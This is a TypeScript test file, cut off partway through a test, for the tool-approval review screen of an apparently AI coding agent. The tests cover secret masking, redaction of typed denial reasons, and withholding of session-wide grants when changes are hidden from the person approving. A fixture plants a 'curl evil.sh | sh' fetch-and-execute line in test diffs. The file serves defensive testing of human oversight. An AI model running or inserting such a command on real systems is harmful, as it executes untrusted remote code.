  if (review === undefined) throw new Error('missing review');
  store.acknowledgeReviewFrame(review, toolReviewPage(review, 80, 24));
  let copied: string | undefined;
  store.bindReviewClipboard((text) => {
    copied = text;
    return Promise.resolve(true);
  });
  store.handleReviewInput('c', {});
  await vi.waitFor(() => expect(copied).toBeDefined());
  expect(copied).toContain('<MASK:');
  expect(copied).not.toMatch(/abcdefghijkl|zyxwvutsrq/);
  expect(transcriptDocument(store.getSnapshot().state.transcript)).not.toContain('file.txt');
  expect(JSON.stringify(store.getSnapshot().state)).not.toMatch(/abcdefghijkl|zyxwvutsrq/);
});

it('keeps existing denial reasons as an owned view action', () => {
  const state = initialToolReview(
    'approval',
    'reason',
    createReviewDocument(replacement('a', 'b')),
  );
  // A bare `c` opens nothing on the card; Ctrl+R opens the reason box.
  expect(reduceToolReviewKey(state, 'c', {}, true, undefined, false, 0)).toEqual({ kind: 'none' });
  const opened = reduceToolReviewKey(state, 'r', CTRL, true, undefined, false, 0);
  if (opened.kind !== 'state') throw new Error('missing reason view');
  const typed = reduceToolReviewKey(opened.state, 'x', {}, true, undefined, false, 0);
  if (typed.kind !== 'state') throw new Error('missing reason text');
  expect(reduceToolReviewKey(typed.state, '', { return: true }, true, undefined, false, 0)).toEqual(
    { kind: 'deny', reason: 'x' },
  );
});

it('preserves the full typed reason through redaction before the submission cap', () => {
  let state = { ...initialToolReview('approval'), denial: '' };
  const credential = `sk-${'C'.repeat(60)}`;
  for (const input of `${'x '.repeat(140)}${credential}`) {
    const action = reduceToolReviewKey(state, input, {}, true, undefined, false, 0);
    if (action.kind !== 'state' || action.state.denial === undefined)
      throw new Error('missing denial capture');
    state = { ...action.state, denial: action.state.denial };
  }
  const submitted = reduceToolReviewKey(state, '', { return: true }, true, undefined, false, 0);
  expect(submitted.kind).toBe('deny');
  expect(JSON.stringify(submitted)).toContain('[REDACTED]');
  expect(JSON.stringify(submitted)).not.toContain('sk-');
  const oversized = { ...state, denial: 'x'.repeat(4096) };
  const overflow = reduceToolReviewKey(oversized, 'x', {}, true, undefined, false, 0);
  if (overflow.kind !== 'state') throw new Error('missing overflow capture');
  expect(
    reduceToolReviewKey(overflow.state, '', { return: true }, true, undefined, false, 0),
  ).toEqual({ kind: 'deny', reason: 'denial explanation omitted (too long)' });
});

it.each([
  [78, 2],
  [118, 16],
])(
  'keeps revealed numeric copy inside the exact %s-column, %s-row source window',
  (columns, rows) => {
    // The text after the mask is the part the revealed window must never reach, and it is NON-ASCII so that the numeric
    // view tokenises it (`界` is `<U+754C>`): the masked projection of the same cursor shows it, the exact window does not.
    // The secret is longer than the largest window (16 rows of ~116 columns), so the window ends inside it.
    const document = createReviewDocument({
      kind: 'operation',
      fields: [{ name: 'value', value: 'sk-proj-' + 'a'.repeat(4000) + ' 界FUTURE_UNSEEN' }],
    });
    const mask = document.masks[0];
    if (mask === undefined) throw new Error('missing test mask');
    expect(document.masks, 'one mask covers the whole secret').toHaveLength(1);
    expect(mask.end - mask.start).toBe(8 + 4000);
    const cursor = { line: 1, offset: mask.start + 30 };
    const revealed = projectReviewPage(document, cursor, columns, rows, true, true);
    const independentMasked = projectReviewPage(document, cursor, columns, rows, false, true);
    expect(revealed.valid).toBe(true);
    expect(independentMasked.rows.join('\n')).toContain('<U+754C>');
    const companion = revealed.maskedRows.join('\n');
    expect(companion).not.toContain('FUTURE_UNSEEN');
    expect(companion).not.toContain('界');
    expect(companion).not.toContain('<U+754C>');
    expect(companion).not.toContain('aaaa');
    const maskedBytes = [...companion.matchAll(/<MASK:id=(\d+);bytes=(\d+)>/gu)];
    expect(maskedBytes.every((match) => Number(match[1]) === mask.id)).toBe(true);
    expect(maskedBytes.reduce((sum, match) => sum + Number(match[2]), 0)).toBe(
      revealed.shown.reduce(
        (sum, range) =>
          sum + reviewBytes(document.fields[range.field]?.text.slice(range.start, range.end) ?? ''),
        0,
      ),
    );
  },
);

it('pages all 4096 admitted target characters without reveal, while requiring acknowledged full-target inspection', () => {
  const document = createReviewDocument({
    kind: 'operation',
    target: 'x'.repeat(4096),
    fields: [],
  });
  let state = initialToolReview('approval', 'long', document);
  const earlyFull = toolReviewPage({ ...state, screen: 'full' }, 80, 24);
  expect(earlyFull?.requiredTarget).toEqual({ field: 0, start: 0, end: 4096 });
  const card = toolReviewPage(state, 80, 24);
  const header = toolReviewTarget(state, 80, 24);
  expect(card?.valid).toBe(true);
  expect(header?.hiddenBytes).toBe(4096 - (header?.next?.offset ?? 0));
  if (card === undefined) throw new Error('missing card');
  state = acknowledgeToolReview(state, card);
  expect(reviewInspected(state)).toBe(false);
  expect(reduceToolReviewKey(state, 'y', CTRL, true, card, false, 0).kind).toBe('none');
  state = { ...state, screen: 'full' };
  let pages = 0;
  for (;;) {
    const page = toolReviewPage(state, 80, 24);
    if (page === undefined) throw new Error('missing page');
    expect(page.valid).toBe(true);
    state = acknowledgeToolReview(state, page);
    pages++;
    if (page.next === undefined) break;
    expect(page.hiddenBytes).toBe(4096 - page.next.offset);
    state = { ...state, cursor: page.next };
    expect(pages).toBeLessThan(100);
  }
  expect(pages).toBeGreaterThan(1);
  expect(state.reveal).toBe(false);
  expect(reviewInspected(state)).toBe(true);
  expect(
    reduceToolReviewKey(state, 'y', CTRL, true, toolReviewPage(state, 80, 24), false, 0),
  ).toEqual({ kind: 'approve', scope: 'once' });
  expect(
    createReviewDocument({ kind: 'operation', target: 'x'.repeat(4097), fields: [] }).valid,
  ).toBe(false);
});

describe('the target budget leaves room for the verb the card prints before it', () => {
  const stateFor = (target: string) =>
    initialToolReview(
      'approval',
      'budget',
      createReviewDocument({ kind: 'operation', target, fields: [] }),
    );

  it.each([70, 71, 78, 120])(
    'draws every projected row of a %i-character target inside the title row, with the longest verb',
    (length) => {
      const rows = toolReviewTarget(stateFor('d'.repeat(length)), 80, 24)?.rows ?? [];
      expect(rows.length).toBeGreaterThan(0);
      rows.forEach((row, index) => {
        // The card strips the `target ` label and prints `<verb> <row>` first, `  <row>` after it.
        const drawn = row.slice('target '.length);
        const title = index === 0 ? `Overwrite ${drawn}` : `  ${drawn}`;
        expect(displayWidth(title), `row ${index}`).toBeLessThanOrEqual(80 - 2);
      });
    },
  );

  it('marks the target shortened — and requires inspecting it — exactly when it no longer fits the title rows', () => {
    // 80 columns: 78 drawable − 10 for `Overwrite ` − 7 for the `target ` label inside the projection, over two rows.
    const fits = 2 * (80 - 2 - CARD_VERB_COLUMNS - 'target '.length);
    const whole = toolReviewPage(stateFor('d'.repeat(fits)), 80, 24);
    expect(whole?.requiredTarget, 'a target that fits needs no extra inspection').toBeUndefined();
    const cut = toolReviewPage(stateFor('d'.repeat(fits + 1)), 80, 24);
    expect(cut?.requiredTarget).toEqual({ field: 0, start: 0, end: fits + 1 });
    if (cut === undefined) throw new Error('missing card');
    expect(
      reduceToolReviewKey(
        acknowledgeToolReview(stateFor('d'.repeat(fits + 1)), cut),
        'y',
        CTRL,
        true,
        cut,
        false,
        0,
      ).kind,
    ).toBe('none');
  });
});

it('keeps a short fully visible target eligible for a one-chord approval on the acknowledged card', () => {
  const state = initialToolReview(
    'approval',
    'short',
    createReviewDocument({ kind: 'operation', target: 'safe.txt', fields: [] }),
  );
  const page = toolReviewPage(state, 80, 24);
  if (page === undefined) throw new Error('missing short card');
  const acknowledged = acknowledgeToolReview(state, page);
  expect(acknowledged.requiredTarget).toBeUndefined();
  expect(reduceToolReviewKey(acknowledged, 'y', CTRL, true, page, false, 0)).toEqual({
    kind: 'approve',
    scope: 'once',
  });
});

it('refuses explicit copy when no source page has been acknowledged', async () => {
  const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
  store.applyToolLiveEvent({
    phase: 'preview',
    callId: 'no-frame',
    toolId: 'git_status',
    preview: { kind: 'operation', target: 'safe.txt', fields: [] },
  });
  store.openDetails();
  store.bindReviewVisibility(() => true);
  store.handleReviewInput('', { return: true });
  const copy = vi.fn(() => Promise.resolve(true));
  store.bindReviewClipboard(copy);
  store.handleReviewInput('c', {});
  await Promise.resolve();
  expect(copy).not.toHaveBeenCalled();
  expect(store.getSnapshot().review?.message).toContain('flushed frame');
});

describe('bounded visible review search', () => {
  const search = (value: string, query: string, offset = 0, reveal = false) => {
    const document = createReviewDocument({
      kind: 'operation',
      fields: [{ name: 'value', value }],
    });
    const state = {
      ...initialToolReview('details', 'search', document),
      searching: true,
      query,
      reveal,
      cursor: { line: 1, offset },
    };
    const action = reduceToolReviewKey(state, '', { return: true }, true, undefined, false, 0);
    if (action.kind !== 'state') throw new Error('missing search state');
    return { state, found: action.state };
  };

  it('continues after a masked first hit to a visible later hit on the same line', () => {
    const value = 'sk-proj-testidabcdefghijklmnop testid';
    const { state, found } = search(value, 'testid');
    expect(state.document?.masks).not.toHaveLength(0);
    expect(found.cursor).toEqual({ line: 1, offset: value.lastIndexOf('testid') });
    expect(found.message).toBe('Match found');
    // The cursor MOVED off the masked first hit to the later visible one (it used to be proved by the back stack's push).
    expect(found.cursor).not.toEqual(state.cursor);
    expect(found.cursor.offset).toBeGreaterThan(value.indexOf('testid'));
    // ADR-0134 §5: the 4,096-position back stack is gone — geometry replaces it, so no state carries one.
    expect('previous' in state).toBe(false);
    expect('previous' in found).toBe(false);
    expect(found.reveal).toBe(false);
  });

  it('does not distinguish a hidden match from no match, while deliberate reveal can find it', () => {
    const value = 'sk-proj-testidabcdefghijklmnop';
    const hidden = search(value, 'testid');
    const absent = search(value, 'not-present');
    expect(hidden.found.cursor).toEqual(hidden.state.cursor);
    // A hidden hit changes nothing but the message and the closed search box: no cursor move, no reveal.
    expect(hidden.found).toEqual({
      ...hidden.state,
      searching: false,
      message: 'No later visible match',
    });
    expect(hidden.found.message).toBe('No later visible match');
    expect(absent.found.message).toBe(hidden.found.message);
    expect(search(value, 'testid', 0, true).found.cursor).toEqual({
      line: 1,
      offset: value.indexOf('testid'),
    });
  });

  it('keeps overlapping visible candidates after the blocking mask boundary', () => {
    const value = 'sk-proj-' + 'a'.repeat(25) + '.a.a';
    const { state, found } = search(value, 'a.a');
    const mask = state.document?.masks[0];
    if (mask === undefined) throw new Error('missing test mask');
    expect(value.indexOf('a.a')).toBeLessThan(mask.end);
    expect(value.lastIndexOf('a.a')).toBeLessThan(value.indexOf('a.a') + 3);
    expect(found.cursor).toEqual({ line: 1, offset: value.lastIndexOf('a.a') });
  });

  it('honors cursors inside a mask, after an earlier visible hit, and after all hits', () => {
    const value = 'sk-proj-testidabcdefghijklmnop testid testid';
    const firstVisible = value.indexOf(' testid') + 1;
    expect(search(value, 'testid', 10).found.cursor.offset).toBe(firstVisible);
    expect(search(value, 'testid', firstVisible + 1).found.cursor.offset).toBe(
      value.lastIndexOf('testid'),
    );
    const exhausted = search(value, 'testid', value.lastIndexOf('testid') + 1);
    expect(exhausted.found.message).toBe('No later visible match');
    expect(exhausted.found.cursor).toEqual(exhausted.state.cursor);
  });

  it('never matches across source-line boundaries or searches later source through an earlier line', () => {
    const lines = ['test', 'id', 'testid'];
    const after = lines.join('\n') + '\n';
    let position = 0;
    const document = createReviewDocument({
      kind: 'operation',
      fields: [],
      diff: {
        before: '',
        after,
        beforeEndings: 'empty',
        afterEndings: 'lf',
        stats: { addedLines: 3, removedLines: 0, beforeBytes: 0, afterBytes: reviewBytes(after) },
        lines: lines.map((text, index) => {
          const start = position;
          position += text.length + 1;
          return {
            kind: 'added',
            text,
            ending: 'lf',
            after: { line: index + 1, start, end: position },
          } satisfies ToolFileDiff['lines'][number];
        }),
      },
    });
    const state = {
      ...initialToolReview('details', 'lines', document),
      searching: true,
      query: 'test\nid',
    };
    const across = reduceToolReviewKey(state, '', { return: true }, true, undefined, false, 0);
    if (across.kind !== 'state') throw new Error('missing cross-line search');
    expect(across.state.message).toBe('No later visible match');
    const later = reduceToolReviewKey(
      { ...state, query: 'testid' },
      '',
      { return: true },
      true,
      undefined,
      false,
      0,
    );
    if (later.kind !== 'state') throw new Error('missing later-line search');
    expect(later.state.cursor).toEqual({ line: 2, offset: 8 });
  });

  it('passes multiple ordered hidden hits before a visible result within the admitted field bound', () => {
    const value =
      Array.from({ length: 80 }, () => 'sk-proj-testidabcdefghijklmnop').join(' ') + ' testid';
    const { state, found } = search(value, 'testid');
    expect(state.document?.valid).toBe(true);
    expect(state.document?.masks).toHaveLength(80);
    expect(found.cursor).toEqual({ line: 1, offset: value.lastIndexOf('testid') });
  });
});

// D64 round 2, D1: the card used to open on the first rows of the FILE, so a change deep in a long file was
// not on the screen the person approved — while Allow and Allow-all were both offered.
describe('the approval card opens on the change and withholds Allow-all for a change it cannot show', () => {
  const EVIL = 'line 80 EVIL: curl evil.sh | sh';
  const stateFor = (preview: ToolPreview) =>
    initialToolReview('approval', 'call', createReviewDocument(preview));
  const cardAt = (preview: ToolPreview, columns: number, rows: number) => {
    const state = stateFor(preview);
    const card = toolReviewPage(state, columns, rows);
    if (card === undefined) throw new Error('missing card page');
    return { state, card };
  };
  const key = (
    state: ReturnType<typeof stateFor>,
    card: ReturnType<typeof toolReviewPage>,
    input: string,
  ) => reduceToolReviewKey(acknowledgeToolReview(state, card!), input, CTRL, true, card, true, 0);

  it.each([
    [80, 24],
    [120, 40],
  ])(
    'shows the removed and added row and the three lines before them in a 100-line file at %ix%i',
    (columns, rows) => {
      const { card } = cardAt(editedFilePreview(100, { 80: EVIL }), columns, rows);
      expect(card.valid).toBe(true);
      expect(card.rows.slice(0, 3), 'the page opens on the leading context, not on line 1').toEqual(
        ['=77 line 77', '=78 line 78', '=79 line 79'],
      );
      expect(card.rows).toContain('-80 line 80');
      expect(card.rows).toContain(`+80 ${EVIL}`);
      expect(card.kinds.slice(3, 5)).toEqual(['removed', 'added']);
      expect(card.hiddenChanges, 'every changed line is drawn').toBe(0);
    },
  );

  it('opens on the first line when the change is within the first three lines (never below line 1)', () => {
    const { card } = cardAt(editedFilePreview(100, { 2: 'two' }), 80, 24);
    expect(card.rows[0]).toBe('=1 line 1');
    expect(card.rows).toContain('+2 two');
    expect(card.hiddenChanges).toBe(0);
  });

  it('counts every changed line the card cannot draw, and withholds the session-wide grant', () => {
    const { state, card } = cardAt(editedFilePreview(100, { 5: 'five', 90: EVIL }), 80, 24);
    expect(card.rows).toContain('+5 five');
    expect(card.rows.join('\n')).not.toContain('EVIL');
    // Line 90's removed and added rows are the two changed lines that are not on the card.
    expect(card.hiddenChanges).toBe(2);
    expect(
      key(state, card, 'g'),
      '[Ctrl+G] must do nothing while a changed line is not shown',
    ).toEqual({
      kind: 'none',
    });
    expect(key(state, card, 'y'), '[Ctrl+Y] stays').toEqual({ kind: 'approve', scope: 'once' });
    expect(key(state, card, 'n'), '[Ctrl+N] stays').toEqual({ kind: 'deny' });
  });

  it('makes room for the warning row: the body gives up a row, so the card still fits its budget', () => {
    const preview = editedFilePreview(100, { 5: 'five', 90: EVIL });
    const { state, card } = cardAt(preview, 80, 24);
    const spent =
      CARD_RULE_ROWS +
      1 + // the title row
      card.rows.length +
      1 + // the summary row
      cardWarnings({
        document: state.document,
        shortenedTarget: false,
        targetHiddenBytes: 0,
        inspected: true,
        changesNotShown: card.hiddenChanges,
        columns: 78,
      }).length +
      CARD_KEY_ROWS;
    expect(spent).toBe(cardRowBudget(24));
  });

  it('keeps [Ctrl+G] for a short change that fits whole', () => {
    const { state, card } = cardAt(editedFilePreview(8, { 4: 'four' }), 80, 24);
    expect(card.hiddenChanges).toBe(0);
    expect(key(state, card, 'g')).toEqual({ kind: 'approve', scope: 'always' });
  });

  it('withholds [Ctrl+G] for a large new file, whose every line is a change the card cannot hold', () => {
    const lines = 200;
    const text = Array.from({ length: lines }, (_, index) => `row ${index + 1}`);
    let offset = 0;
    const preview: ToolPreview = {
      kind: 'operation',
      target: 'big.txt',
      fields: [],
      diff: {
        before: null,
        after: `${text.join('\n')}\n`,
        beforeEndings: 'empty',
        afterEndings: 'lf',
        stats: {
          addedLines: lines,
          removedLines: 0,
          beforeBytes: 0,
          afterBytes: reviewBytes(`${text.join('\n')}\n`),
        },
        lines: text.map((row, index) => {
          const start = offset;
          offset += row.length + 1;
          return {
            kind: 'added' as const,
            text: row,
            ending: 'lf' as const,
            after: { line: index + 1, start, end: offset },
          };
        }),
      },
    };
    const { state, card } = cardAt(preview, 80, 24);
    expect(card.hiddenChanges).toBe(lines - card.rows.length);
    expect(card.hiddenChanges).toBeGreaterThan(0);
    expect(key(state, card, 'g')).toEqual({ kind: 'none' });
  });

  // PR #99 security sitting E2: this test used to pin the OPPOSITE ("the full view lists the whole change by paging, so
  // [a] stays") — but a page of the full view shows only its own rows, and the session-wide grant would cover a change
  // the person never saw. The full view now follows the same rule as the card (see the block below).
  it('withholds [Ctrl+G] in the full view while a changed line is missing from the page it draws', () => {
    const state = {
      ...stateFor(editedFilePreview(100, { 5: 'five', 90: EVIL })),
      screen: 'full' as const,
    };
    const page = toolReviewPage(state, 80, 24);
    expect(page?.hiddenChanges).toBeGreaterThan(0);
    expect(
      reduceToolReviewKey(acknowledgeToolReview(state, page!), 'g', CTRL, true, page, true, 0),
    ).toEqual({ kind: 'none' });
  });
});

// PR #99 security sitting E2: "a partial view earns no session-wide grant" held for the card's diff only. `Ctrl+G` — the key
// and the legend, on the card and in the full view — is offered only when the page being drawn shows everything the grant
// would cover: every changed line of a diff, every line of a preview that has none.
describe('[Ctrl+G] is offered only when the drawn page shows everything it would grant (E2)', () => {
  const stateFor = (
    preview: ToolPreview,
    patch: Partial<ReturnType<typeof initialToolReview>> = {},
  ) => ({
    ...initialToolReview('approval', 'call', createReviewDocument(preview)),
    ...patch,
  });
  const drawn = (state: ReturnType<typeof stateFor>, columns = 80, rows = 24) => {
    const page = toolReviewPage(state, columns, rows);
    if (page === undefined) throw new Error('missing page');
    return page;
  };
  const press = (
    state: ReturnType<typeof stateFor>,
    page: ReturnType<typeof drawn>,
    input: string,
  ) => reduceToolReviewKey(acknowledgeToolReview(state, page), input, CTRL, true, page, true, 0);
  const full = (preview: ToolPreview, cursor = { line: 0, offset: 0 }) =>
    stateFor(preview, { screen: 'full', cursor });
  /** A `run_command`-like preview: no diff, the argument vector is a field. */
  const command = (extra: number): ToolPreview => ({
    kind: 'operation',
    target: 'git',
    fields: [
      {
        name: 'args',
        value: JSON.stringify([
          'status',
          ...Array.from(
            { length: extra },
            (_, index) => `--pathspec-from-file=docs/file-${index}.txt`,
          ),
        ]),
      },
    ],
  });

  describe('a diff', () => {
    it('the full view first page of a 400-line file edited at lines 5 and 390 grants nothing session-wide', () => {
      const state = full(editedFilePreview(400, { 5: 'five', 390: 'EVIL 390' }));
      const page = drawn(state);
      expect(page.rows.join('\n'), 'the page shows only the top of the file').not.toContain('EVIL');
      expect(page.hiddenChanges).toBeGreaterThan(0);
      expect(reviewOffersAlways(state, page, true)).toBe(false);
      expect(press(state, page, 'g'), '[Ctrl+G] must leave the approval unresolved').toEqual({
        kind: 'none',
      });
      expect(press(state, page, 'y'), '[Ctrl+Y] stays').toEqual({ kind: 'approve', scope: 'once' });
      expect(press(state, page, 'n'), '[Ctrl+N] stays').toEqual({ kind: 'deny' });
    });

    it('a full-view page that is missing only the first of two changes still grants nothing', () => {
      const preview = editedFilePreview(60, { 5: 'five', 55: 'fifty-five' });
      const document = createReviewDocument(preview);
      const second = document.lines.findIndex((line) => line.label === '+55');
      const state = full(preview, { line: second - 1, offset: 0 });
      const page = drawn(state);
      expect(page.rows.join('\n')).toContain('+55 fifty-five');
      expect(page.hiddenChanges, 'the change before the page is not drawn').toBeGreaterThan(0);
      expect(press(state, page, 'g')).toEqual({ kind: 'none' });
    });

    it('a full-view page that shows every changed line grants it', () => {
      const state = full(editedFilePreview(8, { 4: 'four' }));
      const page = drawn(state);
      expect(page.hiddenChanges).toBe(0);
      expect(reviewOffersAlways(state, page, true)).toBe(true);
      expect(press(state, page, 'g')).toEqual({ kind: 'approve', scope: 'always' });
    });

    // PR #99 corrective sitting G2: a page that STARTS PARTWAY through a changed line did not count that line as hidden,
    // so the last page of one long changed line (a minified bundle, a one-line JSON) offered the session-wide grant
    // for a line whose beginning the person never saw on that page.
    describe('a changed line that spans several full-view pages (G2)', () => {
      // The full view's body is `rows - 1 - 12` = 11 rows at 80x24 (ADR-0134 §3), about 75 characters each beside the
      // `+1 ` gutter, so 4,000 characters are some 54 rows: five pages (1,500 used to fill three of the old 9-row pages
      // and now fill two, which the first assertion below would catch).
      const long = replacement(null, `${'x'.repeat(4000)}\n`);
      /** Every page of the full view, in order, each as the state the person is on when it is drawn. */
      const pages = () => {
        const result: { state: ReturnType<typeof full>; page: ReturnType<typeof drawn> }[] = [];
        let state = full(long);
        for (let guard = 0; guard < 50; guard++) {
          const page = drawn(state);
          result.push({ state, page });
          if (page.next === undefined) break;
          state = full(long, page.next);
        }
        return result;
      };

      it('counts the line as hidden on every page that does not start at its beginning', () => {
        const all = pages();
        expect(all.length, 'the line really does span several pages').toBeGreaterThan(2);
        const partway = all.filter(({ state }) => state.cursor.offset > 0);
        expect(partway.length, 'some page starts partway through the line').toBeGreaterThan(0);
        for (const { state, page } of partway) {
          expect(
            page.hiddenChanges,
            `page at ${JSON.stringify(state.cursor)} starts inside the changed line`,
          ).toBeGreaterThan(0);
          expect(reviewOffersAlways(state, page, true)).toBe(false);
          expect(press(state, page, 'g')).toEqual({ kind: 'none' });
          expect(press(state, page, 'y'), '[Ctrl+Y] stays').toEqual({
            kind: 'approve',
            scope: 'once',
          });
        }
      });

      it('the last page, which reaches the end of the line but not its start, grants nothing', () => {
        const last = pages().at(-1);
        expect(last?.page.next).toBeUndefined();
        expect(last?.state.cursor.offset).toBeGreaterThan(0);
        expect(last?.page.hiddenChanges).toBe(1);
        expect(reviewOffersAlways(last!.state, last!.page, true)).toBe(false);
      });

      it('counts the line once, not twice, for a page that starts and ends inside it', () => {
        const middle = pages().find(({ state, page }) => state.cursor.offset > 0 && page.next);
        expect(middle, 'a page strictly inside the line exists').toBeDefined();
        expect(middle?.page.hiddenChanges).toBe(1);
      });

      it('the first page, which starts at the beginning of the line, still cuts it and grants nothing', () => {
        const first = pages()[0]!;
        expect(first.state.cursor.offset).toBe(0);
        expect(first.page.next).toBeDefined();
        expect(first.page.hiddenChanges).toBe(1);
        expect(reviewOffersAlways(first.state, first.page, true)).toBe(false);
      });

      it('a page that starts at offset 0 of a changed line and shows all of it still offers [Ctrl+G]', () => {
        const short = replacement(null, 'one short line\n');
        const state = full(short);
        const page = drawn(state);
        expect(state.cursor.offset).toBe(0);
        expect(page.next).toBeUndefined();
        expect(page.hiddenChanges).toBe(0);
        expect(reviewOffersAlways(state, page, true)).toBe(true);
      });

      // PR #99 security sitting H4: a cursor's offset is an ABSOLUTE offset into its field (`projectReviewRow` starts at
      // `Math.max(line.start, page.offset)` and a search returns `line.start + relative`), so "starts partway through the
      // line" is `offset > line.start`, never `offset > 0`. Every cursor below therefore carries the line's own
      // absolute start: the old offset-0 and offset-3 cursors sat BELOW it and could not tell the two readings apart.
      describe('a cursor carries an absolute field offset (H4)', () => {
        /** One line inserted after line 30 of a 60-line file: its after-side start is far above 0. */
        const inserted = () => insertedLinePreview(60, 30, 'inserted here');
        const lineAt = (document: ReturnType<typeof createReviewDocument>, label: string) => {
          const index = document.lines.findIndex((line) => line.label === label);
          const line = document.lines[index];
          if (line === undefined) throw new Error(`no line ${label}`);
          return { index, line };
        };

        it('a page starting exactly at the start of the only changed line shows all of it and offers [Ctrl+G]', () => {
          const preview = inserted();
          const { index, line } = lineAt(createReviewDocument(preview), '+31');
          expect(line.start, 'the start is an absolute offset, not 0').toBeGreaterThan(100);
          const state = full(preview, { line: index, offset: line.start });
          const shown = drawn(state);
          expect(shown.rows.join('\n'), 'the page draws the whole change').toContain(
            '+31 inserted here',
          );
          expect(shown.hiddenChanges).toBe(0);
          expect(reviewOffersAlways(state, shown, true)).toBe(true);
          expect(press(state, shown, 'g')).toEqual({ kind: 'approve', scope: 'always' });
        });

        it('a page starting one byte into the changed line does not show its beginning: [Ctrl+G] is withheld', () => {
          const preview = inserted();
          const { index, line } = lineAt(createReviewDocument(preview), '+31');
          const state = full(preview, { line: index, offset: line.start + 1 });
          const shown = drawn(state);
          expect(shown.hiddenChanges, 'the line is counted as not drawn').toBe(1);
          expect(reviewOffersAlways(state, shown, true)).toBe(false);
          expect(press(state, shown, 'g')).toEqual({ kind: 'none' });
          expect(press(state, shown, 'y'), '[Ctrl+Y] stays').toEqual({
            kind: 'approve',
            scope: 'once',
          });
        });

        it('a cursor below the line start is the line start (the projection clamps it)', () => {
          const preview = inserted();
          const { index, line } = lineAt(createReviewDocument(preview), '+31');
          const state = full(preview, { line: index, offset: line.start - 1 });
          const shown = drawn(state);
          expect(shown.rows.join('\n')).toContain('+31 inserted here');
          expect(shown.hiddenChanges).toBe(0);
        });

        it('a search that lands at the start of the only changed line offers [Ctrl+G] (g2-insert.mts)', () => {
          const preview = inserted();
          const document = createReviewDocument(preview);
          let state = full(preview);
          const type = (input: string, key: Parameters<typeof reduceToolReviewKey>[2] = {}) => {
            const action = reduceToolReviewKey(state, input, key, true, drawn(state), true, 1);
            if (action.kind !== 'state') throw new Error(`${input} gave ${action.kind}`);
            state = { ...state, ...action.state };
          };
          type('/');
          for (const character of 'inserted') type(character);
          type('', { return: true });
          const { line } = lineAt(document, '+31');
          expect(
            state.cursor,
            'the search put the page on the line, at its absolute start',
          ).toEqual({
            line: document.lines.indexOf(line),
            offset: line.start,
          });
          const shown = drawn(state);
          expect(shown.rows.join('\n')).toContain('+31 inserted here');
          expect(shown.hiddenChanges).toBe(0);
          expect(reviewOffersAlways(state, shown, true)).toBe(true);
        });

        it('a search that lands inside the changed line withholds [Ctrl+G]', () => {
          const preview = inserted();
          const document = createReviewDocument(preview);
          let state = full(preview);
          const type = (input: string, key: Parameters<typeof reduceToolReviewKey>[2] = {}) => {
            const action = reduceToolReviewKey(state, input, key, true, drawn(state), true, 1);
            if (action.kind !== 'state') throw new Error(`${input} gave ${action.kind}`);
            state = { ...state, ...action.state };
          };
          type('/');
          for (const character of 'here') type(character);
          type('', { return: true });
          const { line } = lineAt(document, '+31');
          expect(state.cursor.offset, 'the match is partway through the line').toBe(line.start + 9);
          expect(reviewOffersAlways(state, drawn(state), true)).toBe(false);
        });

        it('does not count an unchanged line the page starts partway through', () => {
          // A long CONTEXT line is not part of what the grant covers: starting inside it hides no change of its own.
          const preview = editedFilePreview(40, { 30: 'thirty' });
          const document = createReviewDocument(preview);
          const { index, line } = lineAt(document, '=10');
          expect(index).toBeGreaterThan(0);
          expect(line.start, 'an absolute offset well above 3').toBeGreaterThan(50);
          const atStart = drawn(full(preview, { line: index, offset: line.start }));
          const partway = drawn(full(preview, { line: index, offset: line.start + 3 }));
          expect(partway.hiddenChanges).toBe(atStart.hiddenChanges);
        });
      });
    });

    it('a 100-line single change still offers [Ctrl+G] on the card and on the full view', () => {
      const preview = editedFilePreview(100, { 50: 'fifty' });
      const card = stateFor(preview);
      const cardPage = drawn(card);
      expect(cardPage.rows).toContain('+50 fifty');
      expect(cardPage.hiddenChanges).toBe(0);
      expect(reviewOffersAlways(card, cardPage, true), 'on the card').toBe(true);
      expect(press(card, cardPage, 'g')).toEqual({ kind: 'approve', scope: 'always' });
      // The full view opens at the top; the person pages to the change, and then the page shows all of it.
      const document = createReviewDocument(preview);
      const change = document.lines.findIndex((line) => line.label === '-50');
      const atTop = full(preview);
      expect(
        reviewOffersAlways(atTop, drawn(atTop), true),
        'the first page does not show the change',
      ).toBe(false);
      const paged = full(preview, { line: change - 1, offset: 0 });
      const pagedPage = drawn(paged);
      expect(pagedPage.rows).toContain('+50 fifty');
      expect(reviewOffersAlways(paged, pagedPage, true), 'on the full view').toBe(true);
      expect(press(paged, pagedPage, 'g')).toEqual({ kind: 'approve', scope: 'always' });
    });

    it('never offers [Ctrl+G] to a call that may not be remembered, whatever the page shows', () => {
      const state = full(editedFilePreview(8, { 4: 'four' }));
      expect(reviewOffersAlways(state, drawn(state), false)).toBe(false);
    });

    it('offers nothing before a page has been drawn (fail closed)', () => {
      expect(
        reviewOffersAlways(stateFor(editedFilePreview(8, { 4: 'four' })), undefined, true),
      ).toBe(false);
    });
  });

  describe('a preview without a diff', () => {
    it('a clipped run_command card grants nothing session-wide, though its hidden tail is what executes', () => {
      const state = stateFor(command(30));
      const page = drawn(state);
      expect(page.next, 'the argument vector is cut').toBeDefined();
      expect(page.hiddenLines).toBeGreaterThan(0);
      expect(page.hiddenChanges, 'there is no diff, so the old count is blind to it').toBe(0);
      expect(reviewOffersAlways(state, page, true)).toBe(false);
      expect(press(state, page, 'g')).toEqual({ kind: 'none' });
      expect(press(state, page, 'y'), '[Ctrl+Y] stays').toEqual({ kind: 'approve', scope: 'once' });
    });

    it('an unclipped one offers it', () => {
      const state = stateFor(command(2));
      const page = drawn(state);
      expect(page.next).toBeUndefined();
      expect(reviewOffersAlways(state, page, true)).toBe(true);
      expect(press(state, page, 'g')).toEqual({ kind: 'approve', scope: 'always' });
    });

    it('the full view offers it only while the page starts at the top and reaches the end', () => {
      const small = full(command(2));
      expect(reviewOffersAlways(small, drawn(small), true), 'whole preview on one page').toBe(true);
      const clipped = full(command(30));
      const first = drawn(clipped);
      expect(first.next, 'the first page is cut').toBeDefined();
      expect(reviewOffersAlways(clipped, first, true)).toBe(false);
      // Page forward to the last page: it reaches the end of the content, but the rows above it are not drawn.
      let last = clipped;
      let lastPage = first;
      for (let guard = 0; lastPage.next !== undefined && guard < 20; guard++) {
        last = full(command(30), lastPage.next);
        lastPage = drawn(last);
      }
      expect(lastPage.next, 'the last page reaches the end').toBeUndefined();
      expect(last.cursor, 'and it is not the top').not.toEqual({ line: 0, offset: 0 });
